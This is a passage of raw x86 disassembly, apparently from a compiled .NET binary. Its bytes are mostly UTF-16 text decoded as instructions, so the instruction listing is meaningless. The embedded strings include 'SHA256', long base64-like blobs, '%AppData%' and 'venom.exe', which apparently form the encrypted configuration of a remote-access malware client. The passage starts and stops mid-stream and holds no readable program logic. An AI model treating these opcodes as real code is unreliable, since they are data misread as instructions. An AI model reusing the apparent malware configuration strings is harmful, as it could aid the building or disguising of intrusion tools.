  4095d3:	70 74                	jo     0x409649
  4095d5:	79 00                	jns    0x4095d7
  4095d7:	00 00                	add    %al,(%eax)
  4095d9:	0d 53 00 48 00       	or     $0x480053,%eax
  4095de:	41                   	inc    %ecx
  4095df:	00 32                	add    %dh,(%edx)
  4095e1:	00 35 00 36 00 00    	add    %dh,0x3600
  4095e7:	80 d9 46             	sbb    $0x46,%cl
  4095ea:	00 31                	add    %dh,(%ecx)
  4095ec:	00 59 00             	add    %bl,0x0(%ecx)
  4095ef:	6a 00                	push   $0x0
  4095f1:	4e                   	dec    %esi
  4095f2:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  4095f6:	00 55 00             	add    %dl,0x0(%ebp)
  4095f9:	48                   	dec    %eax
  4095fa:	00 32                	add    %dh,(%edx)
  4095fc:	00 34 00             	add    %dh,(%eax,%eax,1)
  4095ff:	59                   	pop    %ecx
  409600:	00 30                	add    %dh,(%eax)
  409602:	00 4e 00             	add    %cl,0x0(%esi)
  409605:	67 00 58 00          	add    %bl,0x0(%bx,%si)
  409609:	79 00                	jns    0x40960b
  40960b:	48                   	dec    %eax
  40960c:	00 2b                	add    %ch,(%ebx)
  40960e:	00 33                	add    %dh,(%ebx)
  409610:	00 77 00             	add    %dh,0x0(%edi)
  409613:	70 00                	jo     0x409615
  409615:	55                   	push   %ebp
  409616:	00 39                	add    %bh,(%ecx)
  409618:	00 67 00             	add    %ah,0x0(%edi)
  40961b:	76 00                	jbe    0x40961d
  40961d:	30 00                	xor    %al,(%eax)
  40961f:	44                   	inc    %esp
  409620:	00 4b 00             	add    %cl,0x0(%ebx)
  409623:	65 00 47 00          	add    %al,%gs:0x0(%edi)
  409627:	34 00                	xor    $0x0,%al
  409629:	43                   	inc    %ebx
  40962a:	00 53 00             	add    %dl,0x0(%ebx)
  40962d:	38 00                	cmp    %al,(%eax)
  40962f:	6e                   	outsb  %ds:(%esi),(%dx)
  409630:	00 65 00             	add    %ah,0x0(%ebp)
  409633:	4c                   	dec    %esp
  409634:	00 57 00             	add    %dl,0x0(%edi)
  409637:	43                   	inc    %ebx
  409638:	00 52 00             	add    %dl,0x0(%edx)
  40963b:	33 00                	xor    (%eax),%eax
  40963d:	72 00                	jb     0x40963f
  40963f:	6e                   	outsb  %ds:(%esi),(%dx)
  409640:	00 50 00             	add    %dl,0x0(%eax)
  409643:	4f                   	dec    %edi
  409644:	00 31                	add    %dh,(%ecx)
  409646:	00 78 00             	add    %bh,0x0(%eax)
  409649:	67 00 4d 00          	add    %cl,0x0(%di)
  40964d:	76 00                	jbe    0x40964f
  40964f:	59                   	pop    %ecx
  409650:	00 59 00             	add    %bl,0x0(%ecx)
  409653:	54                   	push   %esp
  409654:	00 57 00             	add    %dl,0x0(%edi)
  409657:	43                   	inc    %ebx
  409658:	00 58 00             	add    %bl,0x0(%eax)
  40965b:	72 00                	jb     0x40965d
  40965d:	4e                   	dec    %esi
  40965e:	00 76 00             	add    %dh,0x0(%esi)
  409661:	33 00                	xor    (%eax),%eax
  409663:	6e                   	outsb  %ds:(%esi),(%dx)
  409664:	00 67 00             	add    %ah,0x0(%edi)
  409667:	67 00 62 00          	add    %ah,0x0(%bp,%si)
  40966b:	54                   	push   %esp
  40966c:	00 2b                	add    %ch,(%ebx)
  40966e:	00 62 00             	add    %ah,0x0(%edx)
  409671:	74 00                	je     0x409673
  409673:	59                   	pop    %ecx
  409674:	00 43 00             	add    %al,0x0(%ebx)
  409677:	6b 00 63             	imul   $0x63,(%eax),%eax
  40967a:	00 63 00             	add    %ah,0x0(%ebx)
  40967d:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  409681:	46                   	inc    %esi
  409682:	00 75 00             	add    %dh,0x0(%ebp)
  409685:	70 00                	jo     0x409687
  409687:	4c                   	dec    %esp
  409688:	00 33                	add    %dh,(%ebx)
  40968a:	00 52 00             	add    %dl,0x0(%edx)
  40968d:	53                   	push   %ebx
  40968e:	00 7a 00             	add    %bh,0x0(%edx)
  409691:	52                   	push   %edx
  409692:	00 51 00             	add    %dl,0x0(%ecx)
  409695:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  409699:	73 00                	jae    0x40969b
  40969b:	75 00                	jne    0x40969d
  40969d:	35 00 2f 00 4f       	xor    $0x4f002f00,%eax
  4096a2:	00 50 00             	add    %dl,0x0(%eax)
  4096a5:	47                   	inc    %edi
  4096a6:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  4096aa:	00 41 00             	add    %al,0x0(%ecx)
  4096ad:	71 00                	jno    0x4096af
  4096af:	59                   	pop    %ecx
  4096b0:	00 56 00             	add    %dl,0x0(%esi)
  4096b3:	76 00                	jbe    0x4096b5
  4096b5:	44                   	inc    %esp
  4096b6:	00 77 00             	add    %dh,0x0(%edi)
  4096b9:	4e                   	dec    %esi
  4096ba:	00 41 00             	add    %al,0x0(%ecx)
  4096bd:	63 00                	arpl   %eax,(%eax)
  4096bf:	3d 00 00 80 b1       	cmp    $0xb1800000,%eax
  4096c4:	30 00                	xor    %al,(%eax)
  4096c6:	32 00                	xor    (%eax),%al
  4096c8:	31 00                	xor    %eax,(%eax)
  4096ca:	34 00                	xor    $0x0,%al
  4096cc:	49                   	dec    %ecx
  4096cd:	00 43 00             	add    %al,0x0(%ebx)
  4096d0:	54                   	push   %esp
  4096d1:	00 46 00             	add    %al,0x0(%esi)
  4096d4:	69 00 79 00 4c 00    	imul   $0x4c0079,(%eax),%eax
  4096da:	75 00                	jne    0x4096dc
  4096dc:	61                   	popa
  4096dd:	00 35 00 6d 00 61    	add    %dh,0x61006d00
  4096e3:	00 39                	add    %bh,(%ecx)
  4096e5:	00 4d 00             	add    %cl,0x0(%ebp)
  4096e8:	44                   	inc    %esp
  4096e9:	00 2b                	add    %ch,(%ebx)
  4096eb:	00 46 00             	add    %al,0x0(%esi)
  4096ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4096ef:	00 2b                	add    %ch,(%ebx)
  4096f1:	00 59 00             	add    %bl,0x0(%ecx)
  4096f4:	74 00                	je     0x4096f6
  4096f6:	6d                   	insl   (%dx),%es:(%edi)
  4096f7:	00 61 00             	add    %ah,0x0(%ecx)
  4096fa:	31 00                	xor    %eax,(%eax)
  4096fc:	4f                   	dec    %edi
  4096fd:	00 61 00             	add    %ah,0x0(%ecx)
  409700:	4d                   	dec    %ebp
  409701:	00 53 00             	add    %dl,0x0(%ebx)
  409704:	4f                   	dec    %edi
  409705:	00 79 00             	add    %bh,0x0(%ecx)
  409708:	70 00                	jo     0x40970a
  40970a:	44                   	inc    %esp
  40970b:	00 56 00             	add    %dl,0x0(%esi)
  40970e:	37                   	aaa
  40970f:	00 37                	add    %dh,(%edi)
  409711:	00 31                	add    %dh,(%ecx)
  409713:	00 39                	add    %bh,(%ecx)
  409715:	00 4c 00 4b          	add    %cl,0x4b(%eax,%eax,1)
  409719:	00 31                	add    %dh,(%ecx)
  40971b:	00 41 00             	add    %al,0x0(%ecx)
  40971e:	72 00                	jb     0x409720
  409720:	32 00                	xor    (%eax),%al
  409722:	50                   	push   %eax
  409723:	00 4d 00             	add    %cl,0x0(%ebp)
  409726:	73 00                	jae    0x409728
  409728:	57                   	push   %edi
  409729:	00 5a 00             	add    %bl,0x0(%edx)
  40972c:	7a 00                	jp     0x40972e
  40972e:	73 00                	jae    0x409730
  409730:	51                   	push   %ecx
  409731:	00 63 00             	add    %ah,0x0(%ebx)
  409734:	2f                   	das
  409735:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  409739:	00 79 00             	add    %bh,0x0(%ecx)
  40973c:	50                   	push   %eax
  40973d:	00 37                	add    %dh,(%edi)
  40973f:	00 62 00             	add    %ah,0x0(%edx)
  409742:	56                   	push   %esi
  409743:	00 55 00             	add    %dl,0x0(%ebp)
  409746:	77 00                	ja     0x409748
  409748:	50                   	push   %eax
  409749:	00 4f 00             	add    %cl,0x0(%edi)
  40974c:	47                   	inc    %edi
  40974d:	00 2f                	add    %ch,(%edi)
  40974f:	00 41 00             	add    %al,0x0(%ecx)
  409752:	6b 00 49             	imul   $0x49,(%eax),%eax
  409755:	00 44 00 43          	add    %al,0x43(%eax,%eax,1)
  409759:	00 37                	add    %dh,(%edi)
  40975b:	00 69 00             	add    %ch,0x0(%ecx)
  40975e:	57                   	push   %edi
  40975f:	00 68 00             	add    %ch,0x0(%eax)
  409762:	37                   	aaa
  409763:	00 63 00             	add    %ah,0x0(%ebx)
  409766:	67 00 72 00          	add    %dh,0x0(%bp,%si)
  40976a:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40976e:	67 00 3d             	add    %bh,(%di)
  409771:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  409777:	57                   	push   %edi
  409778:	00 31                	add    %dh,(%ecx)
  40977a:	00 79 00             	add    %bh,0x0(%ecx)
  40977d:	52                   	push   %edx
  40977e:	00 4f 00             	add    %cl,0x0(%edi)
  409781:	6a 00                	push   $0x0
  409783:	48                   	dec    %eax
  409784:	00 71 00             	add    %dh,0x0(%ecx)
  409787:	58                   	pop    %eax
  409788:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40978c:	00 33                	add    %dh,(%ebx)
  40978e:	00 33                	add    %dh,(%ebx)
  409790:	00 2b                	add    %ch,(%ebx)
  409792:	00 79 00             	add    %bh,0x0(%ecx)
  409795:	38 00                	cmp    %al,(%eax)
  409797:	37                   	aaa
  409798:	00 4d 00             	add    %cl,0x0(%ebp)
  40979b:	4a                   	dec    %edx
  40979c:	00 64 00 2f          	add    %ah,0x2f(%eax,%eax,1)
  4097a0:	00 51 00             	add    %dl,0x0(%ecx)
  4097a3:	53                   	push   %ebx
  4097a4:	00 5a 00             	add    %bl,0x0(%edx)
  4097a7:	50                   	push   %eax
  4097a8:	00 73 00             	add    %dh,0x0(%ebx)
  4097ab:	6a 00                	push   $0x0
  4097ad:	46                   	inc    %esi
  4097ae:	00 4b 00             	add    %cl,0x0(%ebx)
  4097b1:	7a 00                	jp     0x4097b3
  4097b3:	4d                   	dec    %ebp
  4097b4:	00 33                	add    %dh,(%ebx)
  4097b6:	00 78 00             	add    %bh,0x0(%eax)
  4097b9:	67 00 6c 00          	add    %ch,0x0(%si)
  4097bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4097be:	00 43 00             	add    %al,0x0(%ebx)
  4097c1:	75 00                	jne    0x4097c3
  4097c3:	37                   	aaa
  4097c4:	00 73 00             	add    %dh,0x0(%ebx)
  4097c7:	38 00                	cmp    %al,(%eax)
  4097c9:	72 00                	jb     0x4097cb
  4097cb:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  4097cf:	43                   	inc    %ebx
  4097d0:	00 47 00             	add    %al,0x0(%edi)
  4097d3:	69 00 66 00 71 00    	imul   $0x710066,(%eax),%eax
  4097d9:	7a 00                	jp     0x4097db
  4097db:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  4097df:	6a 00                	push   $0x0
  4097e1:	57                   	push   %edi
  4097e2:	00 4b 00             	add    %cl,0x0(%ebx)
  4097e5:	34 00                	xor    $0x0,%al
  4097e7:	76 00                	jbe    0x4097e9
  4097e9:	70 00                	jo     0x4097eb
  4097eb:	76 00                	jbe    0x4097ed
  4097ed:	79 00                	jns    0x4097ef
  4097ef:	77 00                	ja     0x4097f1
  4097f1:	36 00 75 00          	add    %dh,%ss:0x0(%ebp)
  4097f5:	52                   	push   %edx
  4097f6:	00 38                	add    %bh,(%eax)
  4097f8:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  4097fc:	00 4f 00             	add    %cl,0x0(%edi)
  4097ff:	6f                   	outsl  %ds:(%esi),(%dx)
  409800:	00 6a 00             	add    %ch,0x0(%edx)
  409803:	46                   	inc    %esi
  409804:	00 31                	add    %dh,(%ecx)
  409806:	00 72 00             	add    %dh,0x0(%edx)
  409809:	66 00 43 00          	data16 add %al,0x0(%ebx)
  40980d:	30 00                	xor    %al,(%eax)
  40980f:	4d                   	dec    %ebp
  409810:	00 61 00             	add    %ah,0x0(%ecx)
  409813:	55                   	push   %ebp
  409814:	00 50 00             	add    %dl,0x0(%eax)
  409817:	70 00                	jo     0x409819
  409819:	46                   	inc    %esi
  40981a:	00 6b 00             	add    %ch,0x0(%ebx)
  40981d:	56                   	push   %esi
  40981e:	00 72 00             	add    %dh,0x0(%edx)
  409821:	77 00                	ja     0x409823
  409823:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  409828:	80 b1 58 00 37 00 4a 	xorb   $0x4a,0x370058(%ecx)
  40982f:	00 49 00             	add    %cl,0x0(%ecx)
  409832:	5a                   	pop    %edx
  409833:	00 75 00             	add    %dh,0x0(%ebp)
  409836:	61                   	popa
  409837:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40983b:	00 5a 00             	add    %bl,0x0(%edx)
  40983e:	79 00                	jns    0x409840
  409840:	62 00                	bound  %eax,(%eax)
  409842:	34 00                	xor    $0x0,%al
  409844:	4d                   	dec    %ebp
  409845:	00 5a 00             	add    %bl,0x0(%edx)
  409848:	30 00                	xor    %al,(%eax)
  40984a:	39 00                	cmp    %eax,(%eax)
  40984c:	31 00                	xor    %eax,(%eax)
  40984e:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  409852:	4d                   	dec    %ebp
  409853:	00 52 00             	add    %dl,0x0(%edx)
  409856:	6f                   	outsl  %ds:(%esi),(%dx)
  409857:	00 78 00             	add    %bh,0x0(%eax)
  40985a:	36 00 44 00 45       	add    %al,%ss:0x45(%eax,%eax,1)
  40985f:	00 2f                	add    %ch,(%edi)
  409861:	00 55 00             	add    %dl,0x0(%ebp)
  409864:	37                   	aaa
  409865:	00 6f 00             	add    %ch,0x0(%edi)
  409868:	48                   	dec    %eax
  409869:	00 2b                	add    %ch,(%ebx)
  40986b:	00 37                	add    %dh,(%edi)
  40986d:	00 4e 00             	add    %cl,0x0(%esi)
  409870:	6c                   	insb   (%dx),%es:(%edi)
  409871:	00 59 00             	add    %bl,0x0(%ecx)
  409874:	6c                   	insb   (%dx),%es:(%edi)
  409875:	00 6f 00             	add    %ch,0x0(%edi)
  409878:	37                   	aaa
  409879:	00 42 00             	add    %al,0x0(%edx)
  40987c:	38 00                	cmp    %al,(%eax)
  40987e:	2f                   	das
  40987f:	00 2f                	add    %ch,(%edi)
  409881:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  409885:	00 48 00             	add    %cl,0x0(%eax)
  409888:	76 00                	jbe    0x40988a
  40988a:	58                   	pop    %eax
  40988b:	00 78 00             	add    %bh,0x0(%eax)
  40988e:	62 00                	bound  %eax,(%eax)
  409890:	4f                   	dec    %edi
  409891:	00 41 00             	add    %al,0x0(%ecx)
  409894:	53                   	push   %ebx
  409895:	00 65 00             	add    %ah,0x0(%ebp)
  409898:	76 00                	jbe    0x40989a
  40989a:	74 00                	je     0x40989c
  40989c:	6d                   	insl   (%dx),%es:(%edi)
  40989d:	00 72 00             	add    %dh,0x0(%edx)
  4098a0:	44                   	inc    %esp
  4098a1:	00 6d 00             	add    %ch,0x0(%ebp)
  4098a4:	43                   	inc    %ebx
  4098a5:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  4098a9:	00 78 00             	add    %bh,0x0(%eax)
  4098ac:	30 00                	xor    %al,(%eax)
  4098ae:	59                   	pop    %ecx
  4098af:	00 6b 00             	add    %ch,0x0(%ebx)
  4098b2:	6c                   	insb   (%dx),%es:(%edi)
  4098b3:	00 67 00             	add    %ah,0x0(%edi)
  4098b6:	7a 00                	jp     0x4098b8
  4098b8:	50                   	push   %eax
  4098b9:	00 66 00             	add    %ah,0x0(%esi)
  4098bc:	63 00                	arpl   %eax,(%eax)
  4098be:	35 00 6f 00 37       	xor    $0x37006f00,%eax
  4098c3:	00 61 00             	add    %ah,0x0(%ecx)
  4098c6:	36 00 6a 00          	add    %ch,%ss:0x0(%edx)
  4098ca:	4d                   	dec    %ebp
  4098cb:	00 47 00             	add    %al,0x0(%edi)
  4098ce:	79 00                	jns    0x4098d0
  4098d0:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  4098d4:	67 00 3d             	add    %bh,(%di)
  4098d7:	00 3d 00 00 13 25    	add    %bh,0x25130000
  4098dd:	00 41 00             	add    %al,0x0(%ecx)
  4098e0:	70 00                	jo     0x4098e2
  4098e2:	70 00                	jo     0x4098e4
  4098e4:	44                   	inc    %esp
  4098e5:	00 61 00             	add    %ah,0x0(%ecx)
  4098e8:	74 00                	je     0x4098ea
  4098ea:	61                   	popa
  4098eb:	00 25 00 00 13 76    	add    %ah,0x76130000
  4098f1:	00 65 00             	add    %ah,0x0(%ebp)
  4098f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4098f5:	00 6f 00             	add    %ch,0x0(%edi)
  4098f8:	6d                   	insl   (%dx),%es:(%edi)
  4098f9:	00 2e                	add    %ch,(%esi)
  4098fb:	00 65 00             	add    %ah,0x0(%ebp)
  4098fe:	78 00                	js     0x409900
  409900:	65 00 00             	add    %al,%gs:(%eax)
  409903:	59                   	pop    %ecx
  409904:	4f                   	dec    %edi
  409905:	00 48 00             	add    %cl,0x0(%eax)
  409908:	67 00 31             	add    %dh,(%bx,%di)
  40990b:	00 4d 00             	add    %cl,0x0(%ebp)
  40990e:	48                   	dec    %eax
  40990f:	00 52 00             	add    %dl,0x0(%edx)
  409912:	4a                   	dec    %edx
  409913:	00 65 00             	add    %ah,0x0(%ebp)
  409916:	57                   	push   %edi
  409917:	00 70 00             	add    %dh,0x0(%eax)
  40991a:	73 00                	jae    0x40991c
  40991c:	53                   	push   %ebx
  40991d:	00 48 00             	add    %cl,0x0(%eax)
  409920:	70 00                	jo     0x409922
  409922:	4f                   	dec    %edi
  409923:	00 4d 00             	add    %cl,0x0(%ebp)
  409926:	47                   	inc    %edi
  409927:	00 46 00             	add    %al,0x0(%esi)
  40992a:	4f                   	dec    %edi
  40992b:	00 62 00             	add    %ah,0x0(%edx)
  40992e:	58                   	pop    %eax
  40992f:	00 5a 00             	add    %bl,0x0(%edx)
  409932:	34 00                	xor    $0x0,%al
  409934:	61                   	popa
  409935:	00 6d 00             	add    %ch,0x0(%ebp)
  409938:	68 00 69 00 4d       	push   $0x4d006900
  40993d:	00 31                	add    %dh,(%ecx)
  40993f:	00 68 00             	add    %ch,0x0(%eax)
  409942:	73 00                	jae    0x409944
  409944:	4f                   	dec    %edi
  409945:	00 45 00             	add    %al,0x0(%ebp)
  409948:	73 00                	jae    0x40994a
  40994a:	77 00                	ja     0x40994c
  40994c:	51                   	push   %ecx
  40994d:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  409951:	00 51 00             	add    %dl,0x0(%ecx)
  409954:	54                   	push   %esp
  409955:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  409959:	00 3d 00 00 80 d9    	add    %bh,0xd9800000
  40995f:	2f                   	das
  409960:	00 62 00             	add    %ah,0x0(%edx)
  409963:	50                   	push   %eax
  409964:	00 53 00             	add    %dl,0x0(%ebx)
  409967:	57                   	push   %edi
  409968:	00 79 00             	add    %bh,0x0(%ecx)
  40996b:	6b 00 6e             	imul   $0x6e,(%eax),%eax
  40996e:	00 6f 00             	add    %ch,0x0(%edi)
  409971:	35 00 59 00 74       	xor    $0x74005900,%eax
  409976:	00 6a 00             	add    %ch,0x0(%edx)
  409979:	38 00                	cmp    %al,(%eax)
  40997b:	7a 00                	jp     0x40997d
  40997d:	51                   	push   %ecx
  40997e:	00 71 00             	add    %dh,0x0(%ecx)
  409981:	36 00 51 00          	add    %dl,%ss:0x0(%ecx)
  409985:	44                   	inc    %esp
  409986:	00 47 00             	add    %al,0x0(%edi)
  409989:	7a 00                	jp     0x40998b
  40998b:	6f                   	outsl  %ds:(%esi),(%dx)
  40998c:	00 69 00             	add    %ch,0x0(%ecx)
  40998f:	49                   	dec    %ecx
  409990:	00 58 00             	add    %bl,0x0(%eax)
  409993:	39 00                	cmp    %eax,(%eax)
  409995:	57                   	push   %edi
  409996:	00 37                	add    %dh,(%edi)
  409998:	00 68 00             	add    %ch,0x0(%eax)
  40999b:	61                   	popa
  40999c:	00 6e 00             	add    %ch,0x0(%esi)
  40999f:	6c                   	insb   (%dx),%es:(%edi)
  4099a0:	00 43 00             	add    %al,0x0(%ebx)
  4099a3:	47                   	inc    %edi
  4099a4:	00 38                	add    %bh,(%eax)
  4099a6:	00 4d 00             	add    %cl,0x0(%ebp)
  4099a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4099aa:	00 50 00             	add    %dl,0x0(%eax)
  4099ad:	52                   	push   %edx
  4099ae:	00 6a 00             	add    %ch,0x0(%edx)
  4099b1:	72 00                	jb     0x4099b3
  4099b3:	57                   	push   %edi
  4099b4:	00 4e 00             	add    %cl,0x0(%esi)
  4099b7:	53                   	push   %ebx
  4099b8:	00 58 00             	add    %bl,0x0(%eax)
  4099bb:	49                   	dec    %ecx
  4099bc:	00 78 00             	add    %bh,0x0(%eax)
  4099bf:	4b                   	dec    %ebx
  4099c0:	00 71 00             	add    %dh,0x0(%ecx)
  4099c3:	76 00                	jbe    0x4099c5
  4099c5:	57                   	push   %edi
  4099c6:	00 46 00             	add    %al,0x0(%esi)
  4099c9:	57                   	push   %edi
  4099ca:	00 77 00             	add    %dh,0x0(%edi)
  4099cd:	31 00                	xor    %eax,(%eax)
  4099cf:	59                   	pop    %ecx
  4099d0:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  4099d4:	00 79 00             	add    %bh,0x0(%ecx)
  4099d7:	32 00                	xor    (%eax),%al
  4099d9:	73 00                	jae    0x4099db
  4099db:	6a 00                	push   $0x0
  4099dd:	67 00 77 00          	add    %dh,0x0(%bx)
  4099e1:	71 00                	jno    0x4099e3
  4099e3:	35 00 30 00 36       	xor    $0x36003000,%eax
  4099e8:	00 44 00 79          	add    %al,0x79(%eax,%eax,1)
  4099ec:	00 32                	add    %dh,(%edx)
  4099ee:	00 56 00             	add    %dl,0x0(%esi)
  4099f1:	71 00                	jno    0x4099f3
  4099f3:	47                   	inc    %edi
  4099f4:	00 62 00             	add    %ah,0x0(%edx)
  4099f7:	5a                   	pop    %edx
  4099f8:	00 66 00             	add    %ah,0x0(%esi)
  4099fb:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
  4099ff:	7a 00                	jp     0x409a01
  409a01:	4d                   	dec    %ebp
  409a02:	00 50 00             	add    %dl,0x0(%eax)
  409a05:	35 00 45 00 59       	xor    $0x59004500,%eax
  409a0a:	00 6e 00             	add    %ch,0x0(%esi)
  409a0d:	33 00                	xor    (%eax),%eax
  409a0f:	59                   	pop    %ecx
  409a10:	00 51 00             	add    %dl,0x0(%ecx)
  409a13:	37                   	aaa
  409a14:	00 2f                	add    %ch,(%edi)
  409a16:	00 67 00             	add    %ah,0x0(%edi)
  409a19:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  409a1d:	50                   	push   %eax
  409a1e:	00 67 00             	add    %ah,0x0(%edi)
  409a21:	62 00                	bound  %eax,(%eax)
  409a23:	78 00                	js     0x409a25
  409a25:	71 00                	jno    0x409a27
  409a27:	4f                   	dec    %edi
  409a28:	00 5a 00             	add    %bl,0x0(%edx)
  409a2b:	54                   	push   %esp
  409a2c:	00 72 00             	add    %dh,0x0(%edx)
  409a2f:	4a                   	dec    %edx
  409a30:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  409a34:	00 3d 00 00 92 59    	add    %bh,0x59920000
  409a3a:	2b 00                	sub    (%eax),%eax
  409a3c:	49                   	dec    %ecx
  409a3d:	00 49 00             	add    %cl,0x0(%ecx)
  409a40:	57                   	push   %edi
  409a41:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  409a45:	00 76 00             	add    %dh,0x0(%esi)
  409a48:	55                   	push   %ebp
  409a49:	00 50 00             	add    %dl,0x0(%eax)
  409a4c:	65 00 4a 00          	add    %cl,%gs:0x0(%edx)
  409a50:	6f                   	outsl  %ds:(%esi),(%dx)
  409a51:	00 6d 00             	add    %ch,0x0(%ebp)
  409a54:	61                   	popa
  409a55:	00 42 00             	add    %al,0x0(%edx)
  409a58:	35 00 68 00 75       	xor    $0x75006800,%eax
  409a5d:	00 71 00             	add    %dh,0x0(%ecx)
  409a60:	78 00                	js     0x409a62
  409a62:	70 00                	jo     0x409a64
  409a64:	56                   	push   %esi
  409a65:	00 57 00             	add    %dl,0x0(%edi)
  409a68:	43                   	inc    %ebx
  409a69:	00 57 00             	add    %dl,0x0(%edi)
  409a6c:	61                   	popa
  409a6d:	00 38                	add    %bh,(%eax)
  409a6f:	00 42 00             	add    %al,0x0(%edx)
  409a72:	54                   	push   %esp
  409a73:	00 76 00             	add    %dh,0x0(%esi)
  409a76:	30 00                	xor    %al,(%eax)
  409a78:	52                   	push   %edx
  409a79:	00 70 00             	add    %dh,0x0(%eax)
  409a7c:	73 00                	jae    0x409a7e
  409a7e:	51                   	push   %ecx
  409a7f:	00 34 00             	add    %dh,(%eax,%eax,1)
  409a82:	59                   	pop    %ecx
  409a83:	00 63 00             	add    %ah,0x0(%ebx)
  409a86:	35 00 68 00 66       	xor    $0x66006800,%eax
  409a8b:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
  409a8f:	00 4f 00             	add    %cl,0x0(%edi)
  409a92:	67 00 44 00          	add    %al,0x0(%si)
  409a96:	35 00 59 00 6a       	xor    $0x6a005900,%eax
  409a9b:	00 2b                	add    %ch,(%ebx)
  409a9d:	00 33                	add    %dh,(%ebx)
  409a9f:	00 4a 00             	add    %cl,0x0(%edx)
  409aa2:	37                   	aaa
  409aa3:	00 77 00             	add    %dh,0x0(%edi)
  409aa6:	6d                   	insl   (%dx),%es:(%edi)
  409aa7:	00 34 00             	add    %dh,(%eax,%eax,1)
  409aaa:	56                   	push   %esi
  409aab:	00 53 00             	add    %dl,0x0(%ebx)
  409aae:	5a                   	pop    %edx
  409aaf:	00 39                	add    %bh,(%ecx)
  409ab1:	00 64 00 74          	add    %ah,0x74(%eax,%eax,1)
  409ab5:	00 58 00             	add    %bl,0x0(%eax)
  409ab8:	62 00                	bound  %eax,(%eax)
  409aba:	68 00 43 00 48       	push   $0x48004300
  409abf:	00 72 00             	add    %dh,0x0(%edx)
  409ac2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409ac6:	77 00                	ja     0x409ac8
  409ac8:	4b                   	dec    %ebx
  409ac9:	00 75 00             	add    %dh,0x0(%ebp)
  409acc:	75 00                	jne    0x409ace
  409ace:	55                   	push   %ebp
  409acf:	00 61 00             	add    %ah,0x0(%ecx)
  409ad2:	37                   	aaa
  409ad3:	00 72 00             	add    %dh,0x0(%edx)
  409ad6:	6d                   	insl   (%dx),%es:(%edi)
  409ad7:	00 33                	add    %dh,(%ebx)
  409ad9:	00 2f                	add    %ch,(%edi)
  409adb:	00 55 00             	add    %dl,0x0(%ebp)
  409ade:	63 00                	arpl   %eax,(%eax)
  409ae0:	50                   	push   %eax
  409ae1:	00 51 00             	add    %dl,0x0(%ecx)
  409ae4:	59                   	pop    %ecx
  409ae5:	00 65 00             	add    %ah,0x0(%ebp)
  409ae8:	30 00                	xor    %al,(%eax)
  409aea:	72 00                	jb     0x409aec
  409aec:	37                   	aaa
  409aed:	00 72 00             	add    %dh,0x0(%edx)
  409af0:	50                   	push   %eax
  409af1:	00 41 00             	add    %al,0x0(%ecx)
  409af4:	55                   	push   %ebp
  409af5:	00 46 00             	add    %al,0x0(%esi)
  409af8:	75 00                	jne    0x409afa
  409afa:	4e                   	dec    %esi
  409afb:	00 4d 00             	add    %cl,0x0(%ebp)
  409afe:	76 00                	jbe    0x409b00
  409b00:	67 00 69 00          	add    %ch,0x0(%bx,%di)
  409b04:	56                   	push   %esi
  409b05:	00 4d 00             	add    %cl,0x0(%ebp)
  409b08:	69 00 72 00 78 00    	imul   $0x780072,(%eax),%eax
  409b0e:	39 00                	cmp    %eax,(%eax)
  409b10:	33 00                	xor    (%eax),%eax
  409b12:	51                   	push   %ecx
  409b13:	00 56 00             	add    %dl,0x0(%esi)
  409b16:	63 00                	arpl   %eax,(%eax)
  409b18:	42                   	inc    %edx
  409b19:	00 32                	add    %dh,(%edx)
  409b1b:	00 74 00 4b          	add    %dh,0x4b(%eax,%eax,1)
  409b1f:	00 4e 00             	add    %cl,0x0(%esi)
  409b22:	2b 00                	sub    (%eax),%eax
  409b24:	75 00                	jne    0x409b26
  409b26:	62 00                	bound  %eax,(%eax)
  409b28:	78 00                	js     0x409b2a
  409b2a:	4c                   	dec    %esp
  409b2b:	00 49 00             	add    %cl,0x0(%ecx)
  409b2e:	74 00                	je     0x409b30
  409b30:	68 00 44 00 36       	push   $0x36004400
  409b35:	00 4e 00             	add    %cl,0x0(%esi)
  409b38:	4f                   	dec    %edi
  409b39:	00 6f 00             	add    %ch,0x0(%edi)
  409b3c:	30 00                	xor    %al,(%eax)
  409b3e:	49                   	dec    %ecx
  409b3f:	00 4a 00             	add    %cl,0x0(%edx)
  409b42:	64 00 6c 00 64       	add    %ch,%fs:0x64(%eax,%eax,1)
  409b47:	00 78 00             	add    %bh,0x0(%eax)
  409b4a:	51                   	push   %ecx
  409b4b:	00 38                	add    %bh,(%eax)
  409b4d:	00 4b 00             	add    %cl,0x0(%ebx)
  409b50:	34 00                	xor    $0x0,%al
  409b52:	35 00 48 00 4f       	xor    $0x4f004800,%eax
  409b57:	00 65 00             	add    %ah,0x0(%ebp)
  409b5a:	57                   	push   %edi
  409b5b:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  409b5f:	00 75 00             	add    %dh,0x0(%ebp)
  409b62:	70 00                	jo     0x409b64
  409b64:	74 00                	je     0x409b66
  409b66:	46                   	inc    %esi
